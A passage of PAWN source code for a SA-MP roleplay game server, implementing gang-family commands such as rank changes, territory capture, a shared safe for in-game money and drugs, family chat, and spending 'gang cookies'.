	if(Player[playerid][pFamRank] < Player[user][pFamRank]) return SendClientMessage(playerid, COLOR_GRAD2, "You can't demote higher ranked members.");
    if(Player[playerid][pFamRank] == Player[user][pFamRank] && strcmp(GetName(playerid), FamInfo[idx][fLeader], false)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't promote/demote same ranked members.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[user][pFam] != Player[playerid][pFam]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your family.");
	if(rank < 1 || rank > 6) return SendClientMessage(playerid, COLOR_GRAD2, "Ranks are between 1 and 6.");
	if(Player[user][pFamRank] == rank) return SendClientMessage(playerid, COLOR_GRAD2, "Player already has that rank.");
	if(Player[user][pFamRank] < rank)
	{
	    Player[user][pFamRank] = rank;
		format(string, sizeof(string), "You have {01A9DB}promoted {33CCFF}%s to {01A9DB}%s (%d){33CCFF}.", GetName(user), RPFaRN(user), rank);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string), "%s has {01A9DB}promoted {33CCFF}you to {01A9DB}%s (%d){33CCFF}.", GetName(playerid), RPFaRN(user), rank);
		SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	else if(Player[user][pFamRank] > rank)
	{
	    Player[user][pFamRank] = rank;
		format(string, sizeof(string), "You have {FF9900}demoted {33CCFF}%s to {FF9900}%s (%d){33CCFF}.", GetName(user), RPFaRN(user), rank);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string), "%s has {FF9900}demoted {33CCFF}you to {FF9900}%s (%d){33CCFF}.", GetName(playerid), RPFaRN(user), rank);
		SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	return 1;
}
IRP:points(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
    for(new idx = 0; idx < MAX_POINTS; idx++)
	{
	    format(string, sizeof(string), "%d) %s | Owned by: %s | Profit: $%d | Time Left: %d", idx+1, PointInfo[idx][pName], RFaN(PointInfo[idx][pOwner]), PointInfo[idx][pProfit], PointInfo[idx][pTime]);
	    SendClientMessage(playerid, COLOR_WHITE, string);
	}
	return 1;
}
IRP:capture(playerid, var[])
{
	new string[128], done;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a family leader.");
	for(new idx = 0; idx < MAX_POINTS; idx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 1, PointInfo[idx][pX], PointInfo[idx][pY], PointInfo[idx][pZ]))
		{
		    if(Capturing) return SendClientMessage(playerid, COLOR_GRAD2, "Please wait for the point capturing to cool down.");
		    format(string, sizeof(string), " %s is attempting to capture the %s.", GetName(playerid), PointInfo[idx][pName]);
		    SendNearbyMessage(playerid, 30, string, COLOR_ORANGE, COLOR_ORANGE, COLOR_ORANGE, COLOR_ORANGE, COLOR_ORANGE);
		    SendClientMessage(playerid, COLOR_GRAD2, "** Stay in your position for 10 seconds to make the capture attempt succeed.");
            Capturing = 1;
            GetPlayerPos(playerid, Capture[0], Capture[1], Capture[2]);
            Capturer = playerid;
            CapturerFam = idx;
			SetTimerEx("CapturePoint", 10000, false, "dd", Capturer, CapturerFam);
		    done = 1;
		    break;
		}
    }
    if(!done) SendClientMessage(playerid, COLOR_GRAD2, "You are not near a capturable point.");
	return 1;
}
IRP:families(playerid, var[])
{
	new string[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
	for(new idx=1; idx<MAX_FAMILIES; idx++)
	{
        if(FamInfo[idx][fColor] == 2)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{0000FF}%s {FFFFFF}| Leader: {0000FF}%s {FFFFFF}| Members: %d/{0000FF}10 {FFFFFF}| Strikes: %d/{0000FF}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{0000FF}%s {FFFFFF}| Leader: {0000FF}%s {FFFFFF}| Members: %d/{0000FF}20 {FFFFFF}| Strikes: %d/{0000FF}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{0000FF}%s {FFFFFF}| Leader: {0000FF}%s {FFFFFF}| Members: %d/{0000FF}30 {FFFFFF}| Strikes: %d/{0000FF}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 1)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{00FFFF}%s {FFFFFF}| Leader: {00FFFF}%s {FFFFFF}| Members: %d/{00FFFF}10 {FFFFFF}| Strikes: %d/{00FFFF}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{00FFFF}%s {FFFFFF}| Leader: {00FFFF}%s {FFFFFF}| Members: %d/{00FFFF}20 {FFFFFF}| Strikes: %d/{00FFFF}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{00FFFF}%s {FFFFFF}| Leader: {00FFFF}%s {FFFFFF}| Members: %d/{00FFFF}30 {FFFFFF}| Strikes: %d/{00FFFF}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
		else if(FamInfo[idx][fColor] == 3)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{FF0000}%s {FFFFFF}| Leader: {FF0000}%s {FFFFFF}| Members: %d/{FF0000}10 {FFFFFF}| Strikes: %d/{FF0000}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{FF0000}%s {FFFFFF}| Leader: {FF0000}%s {FFFFFF}| Members: %d/{FF0000}20 {FFFFFF}| Strikes: %d/{FF0000}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{FF0000}%s {FFFFFF}| Leader: {FF0000}%s {FFFFFF}| Members: %d/{FF0000}30 {FFFFFF}| Strikes: %d/{FF0000}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 7)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{088A08}%s {FFFFFF}| Leader: {088A08}%s {FFFFFF}| Members: %d/{088A08}10 {FFFFFF}| Strikes: %d/{088A08}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{088A08}%s {FFFFFF}| Leader: {088A08}%s {FFFFFF}| Members: %d/{088A08}20 {FFFFFF}| Strikes: %d/{088A08}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{088A08}%s {FFFFFF}| Leader: {088A08}%s {FFFFFF}| Members: %d/{088A08}30 {FFFFFF}| Strikes: %d/{088A08}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 6)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{DF7401}%s {FFFFFF}| Leader: {DF7401}%s {FFFFFF}| Members: %d/{DF7401}10 {FFFFFF}| Strikes: %d/{DF7401}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{DF7401}%s {FFFFFF}| Leader: {DF7401}%s {FFFFFF}| Members: %d/{DF7401}20 {FFFFFF}| Strikes: %d/{DF7401}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{DF7401}%s {FFFFFF}| Leader: {DF7401}%s {FFFFFF}| Members: %d/{DF7401}30 {FFFFFF}| Strikes: %d/{DF7401}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 5)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{FFFF00}%s {FFFFFF}| Leader: {FFFF00}%s {FFFFFF}| Members: %d/{FFFF00}10 {FFFFFF}| Strikes: %d/{FFFF00}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{FFFF00}%s {FFFFFF}| Leader: {FFFF00}%s {FFFFFF}| Members: %d/{FFFF00}20 {FFFFFF}| Strikes: %d/{FFFF00}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{FFFF00}%s {FFFFFF}| Leader: {FFFF00}%s {FFFFFF}| Members: %d/{FFFF00}30 {FFFFFF}| Strikes: %d/{FFFF00}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 4)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{B40404}%s {FFFFFF}| Leader: {B40404}%s {FFFFFF}| Members: %d/{B40404}10 {FFFFFF}| Strikes: %d/{B40404}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{B40404}%s {FFFFFF}| Leader: {B40404}%s {FFFFFF}| Members: %d/{B40404}20 {FFFFFF}| Strikes: %d/{B40404}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{B40404}%s {FFFFFF}| Leader: {B40404}%s {FFFFFF}| Members: %d/{B40404}30 {FFFFFF}| Strikes: %d/{B40404}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 8)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{CC2EFA}%s {FFFFFF}| Leader: {CC2EFA}%s {FFFFFF}| Members: %d/{CC2EFA}10 {FFFFFF}| Strikes: %d/{CC2EFA}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{CC2EFA}%s {FFFFFF}| Leader: {CC2EFA}%s {FFFFFF}| Members: %d/{CC2EFA}20 {FFFFFF}| Strikes: %d/{CC2EFA}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{CC2EFA}%s {FFFFFF}| Leader: {CC2EFA}%s {FFFFFF}| Members: %d/{CC2EFA}30 {FFFFFF}| Strikes: %d/{CC2EFA}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 9)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{00FF00}%s {FFFFFF}| Leader: {00FF00}%s {FFFFFF}| Members: %d/{00FF00}10 {FFFFFF}| Strikes: %d/{00FF00}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{00FF00}%s {FFFFFF}| Leader: {00FF00}%s {FFFFFF}| Members: %d/{00FF00}20 {FFFFFF}| Strikes: %d/{00FF00}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{00FF00}%s {FFFFFF}| Leader: {00FF00}%s {FFFFFF}| Members: %d/{00FF00}30 {FFFFFF}| Strikes: %d/{00FF00}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 10)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{A4A4A4}%s {FFFFFF}| Leader: {A4A4A4}%s {FFFFFF}| Members: %d/{A4A4A4}10 {FFFFFF}| Strikes: %d/{A4A4A4}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{A4A4A4}%s {FFFFFF}| Leader: {A4A4A4}%s {FFFFFF}| Members: %d/{A4A4A4}20 {FFFFFF}| Strikes: %d/{A4A4A4}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{A4A4A4}%s {FFFFFF}| Leader: {A4A4A4}%s {FFFFFF}| Members: %d/{A4A4A4}30 {FFFFFF}| Strikes: %d/{A4A4A4}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else if(FamInfo[idx][fColor] == 11)
		{
			if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "{000000}%s {FFFFFF}| Leader: {000000}%s {FFFFFF}| Members: %d/{000000}10 {FFFFFF}| Strikes: %d/{000000}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "{000000}%s {FFFFFF}| Leader: {000000}%s {FFFFFF}| Members: %d/{000000}20 {FFFFFF}| Strikes: %d/{000000}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
        	else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "{000000}%s {FFFFFF}| Leader: {000000}%s {FFFFFF}| Members: %d/{000000}30 {FFFFFF}| Strikes: %d/{000000}3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
        	}
	    }
	    else
		{
            if(FamInfo[idx][fLevel] == 1)
			{
        	    format(string, sizeof(string), "%s | Leader: %s | Members: %d/10 | Strikes: %d/3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
 	        }
 	        else if(FamInfo[idx][fLevel] == 2)
			{
        	    format(string, sizeof(string), "%s | Leader: %s | Members: %d/20 | Strikes: %d/3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
 	        }
 	        else if(FamInfo[idx][fLevel] == 3)
			{
        	    format(string, sizeof(string), "%s | Leader: %s | Members: %d/30 | Strikes: %d/3", FamInfo[idx][fName], FamInfo[idx][fLeader], FamInfo[idx][fMembers], FamInfo[idx][fStrikes]);
        	    SendClientMessage(playerid, COLOR_WHITE, string);
 	        }
	    }
	}
	return 1;
}
IRP:factions(playerid, var[])
{
	new string[256];
   	if(!Logged(playerid)) NoLogin(playerid);
	format(string, sizeof(string), "Los Santos Police Department | Leader: %s | Members: %d | Level Needed: 2 ", FacInfo[1][facLeader], FacInfo[1][facMembers]);
 	SendClientMessage(playerid, COLOR_BLUE, string);
 	format(string, sizeof(string), "San Andreas Government | Leader: %s | Members: %d | Level Needed: 5 ", FacInfo[2][facLeader], FacInfo[2][facMembers]);
 	SendClientMessage(playerid, COLOR_GOV, string);
 	format(string, sizeof(string), "Hitman Agency | Leader: Secret | Members: Secret | Level Needed: 5 ", FacInfo[3][facLeader], FacInfo[3][facMembers]);
 	SendClientMessage(playerid, COLOR_WHITE, string);
 	format(string, sizeof(string), "San Andreas News Agency | Leader: %s | Members: %d | Level Needed: 1 ", FacInfo[4][facLeader], FacInfo[4][facMembers]);
 	SendClientMessage(playerid, COLOR_NEWS, string);
 	format(string, sizeof(string), "Los Santos Fire & Medic Department | Leader: %s | Members: %d | Level Needed: 1", FacInfo[5][facLeader], FacInfo[5][facMembers]);
 	SendClientMessage(playerid, COLOR_MEDIC, string);
 	format(string, sizeof(string), "Department Of Correction | Leader: %s | Members: %d | Level Needed: 2", FacInfo[7][facLeader], FacInfo[7][facMembers]);
 	SendClientMessage(playerid, COLOR_DOC, string);
 	format(string, sizeof(string), "Federal Bureau Of Investigation | Leader: %s | Members: %d | Level Needed: 8", FacInfo[6][facLeader], FacInfo[6][facMembers]);
 	SendClientMessage(playerid, COLOR_RADIO, string);
	return 1;
}
IRP:safe(playerid, var[])
{
	new amount, string[128], options[32];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFam]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a family.");
	new idx = Player[playerid][pFam];
	if(!IsPlayerInRangeOfPoint(playerid, 3, FamInfo[idx][fSafeX], FamInfo[idx][fSafeY], FamInfo[idx][fSafeZ])) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near your family safe.");
	if(sscanf(var, "s[32]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /safe [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: deposit | withdraw");
		format(string, sizeof(string), "** [SAFE]: Money: $%d | Materials: %d | Weed: %d | Cocaine: %d | Seeds: %d ", FamInfo[idx][fMoney], FamInfo[idx][fMats], FamInfo[idx][fWeed], FamInfo[idx][fcocaine], FamInfo[idx][fSeeds]);
		SendClientMessage(playerid, COLOR_WHITE, string);
		return 1;
	}
	if(!strcmp(var, "deposit", true, 7))
	{
	    if(sscanf(var, "s[32]s[32]i", var, options, amount))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /safe deposit [item] [amount]");
			SendClientMessage(playerid, COLOR_GRAD2, "** [ITEMS]: money | materials | weed | cocaine | seeds ");
			return 1;
	    }
	    if(amount < 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid amount.");
        if(!strcmp(options, "money", true, 5))
    	{
            if(Player[playerid][pMoney] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
            FamInfo[idx][fMoney] += amount;
			GiveZamoraMoney(playerid, -amount);
            format(string, sizeof(string), "* %s has deposited $%d in their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
        }
        else if(!strcmp(options, "materials", true, 9))
		{
            if(Player[playerid][pMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much materials on you.");
            FamInfo[idx][fMats] += amount;
            Player[playerid][pMaterials] -= amount;
            format(string, sizeof(string), "* %s has deposited %d grams of materials in their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
        }
        else if(!strcmp(options, "weed", true, 4))
		{
            if(Player[playerid][pWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed on you.");
            FamInfo[idx][fWeed] += amount;
            Player[playerid][pWeed] -= amount;
            format(string, sizeof(string), "* %s has deposited %d grams of weed in their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
        }
        else if(!strcmp(options, "cocaine", true, 5))
        {
            if(Player[playerid][pCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine on you.");
            FamInfo[idx][fcocaine] += amount;
            Player[playerid][pCocaine] -= amount;
            format(string, sizeof(string), "* %s has deposited %d grams of cocaine in their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
        }
        else if(!strcmp(options, "seeds", true, 4))
		{
            if(Player[playerid][pSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds on you.");
            FamInfo[idx][fSeeds] += amount;
            Player[playerid][pSeeds] -= amount;
            format(string, sizeof(string), "* %s has deposited %d seeds in their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
        }
        else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
	}
	else if(!strcmp(var, "withdraw", true, 8))
	{
	    if(Player[playerid][pFamRank] < 5) return NoAuth(playerid);
	    if(sscanf(var, "s[32]s[32]i", var, options, amount))
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /safe withdraw [item] [amount]");
			SendClientMessage(playerid, COLOR_GRAD2, "** [ITEMS]: money | materials | weed | cocaine");
			return 1;
	    }
	    if(amount < 0) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid amount.");
	    if(!strcmp(options, "money", true, 5))
	    {
            if(FamInfo[idx][fMoney] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money in your family safe.");
            FamInfo[idx][fMoney] -= amount;
            GiveZamoraMoney(playerid, amount);
            format(string, sizeof(string), "* %s has withdrawn $%d from their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
		else if(!strcmp(options, "materials", true, 9))
		{
            if(FamInfo[idx][fMats] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much materials in your family safe.");
            FamInfo[idx][fMats] -= amount;
            Player[playerid][pMaterials] += amount;
            format(string, sizeof(string), "* %s has withdrawn %d grams of materials from their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
		else if(!strcmp(options, "weed", true, 4))
		{
            if(FamInfo[idx][fWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed in your family safe.");
            FamInfo[idx][fWeed] -= amount;
            Player[playerid][pWeed] += amount;
            format(string, sizeof(string), "* %s has withdrawn %d grams of weed from their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
        else if(!strcmp(options, "cocaine", true, 5))
        {
            if(FamInfo[idx][fcocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine in your family safe.");
            FamInfo[idx][fcocaine] -= amount;
            Player[playerid][pCocaine] += amount;
            format(string, sizeof(string), "* %s has withdrawn %d grams of cocaine from their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
        }
 		else if(!strcmp(options, "seeds", true, 4))
		{
            if(FamInfo[idx][fSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds in your family safe.");
            FamInfo[idx][fSeeds] -= amount;
            Player[playerid][pSeeds] += amount;
            format(string, sizeof(string), "* %s has withdrawn %d seeds from their family safe.", GetName(playerid), amount);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		}
        else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Invalid option.");
	return 1;
}

IRP:f(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFam]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a family.");
	if(sscanf(var, "s[128]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: (/f)amilychat [text]");
	if(AntiAdv(playerid, var)) return 1;
    format(string, sizeof(string), "** %s %s: %s", RPFaRN(playerid), GetName(playerid), var);
	SendPlayerFamMessage(playerid, COLOR_CYAN, string);
	return 1;
}
IRP:usegangcookies(playerid, var[])
{
	new string[128], idx;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pFamRank] < 5) return NoAuth(playerid);
   	idx = Player[playerid][pFam];
    if(sscanf(var, "s[32]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /usegangcookies [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: Level (60 Cookies) | Weed (30 Cookies) | Cocaine (40 Cookies)");
		format(string, sizeof(string), "* Your family got %d family cookies.", FamInfo[idx][fCookies]);
		SendClientMessage(playerid, COLOR_LIGHTRED, string);
		return 1;
	}
	if(!strcmp(var, "level", true))
	{
	    if(FamInfo[idx][fCookies] < 60) return SendClientMessage(playerid, COLOR_GRAD2, "Your family doesnt have that much of cookies");
	    if(FamInfo[idx][fLevel] == 3) return SendClientMessage(playerid, COLOR_GRAD2, "You've reached the maximum family level.");
		FamInfo[idx][fCookies] -= 60;
		format(string, sizeof(string), "* %s has used some gang cookies to buy level.", GetName(playerid));
 		SendPlayerFamMessage(playerid, COLOR_CYAN, string);
 		FamInfo[idx][fLevel] += 1;
	}
	else if(!strcmp(var, "weed", true))
	{
	    if(FamInfo[idx][fCookies] < 30) return SendClientMessage(playerid, COLOR_GRAD2, "Your family doesnt have that much of cookies");
		FamInfo[idx][fCookies] -= 30;
		format(string, sizeof(string), "* %s has used some gang cookies to buy 20 grams of weed.", GetName(playerid));
 		SendPlayerFamMessage(playerid, COLOR_CYAN, string);
 		FamInfo[idx][fWeed] += 20;
	}
	else if(!strcmp(var, "cocaine", true))
	{
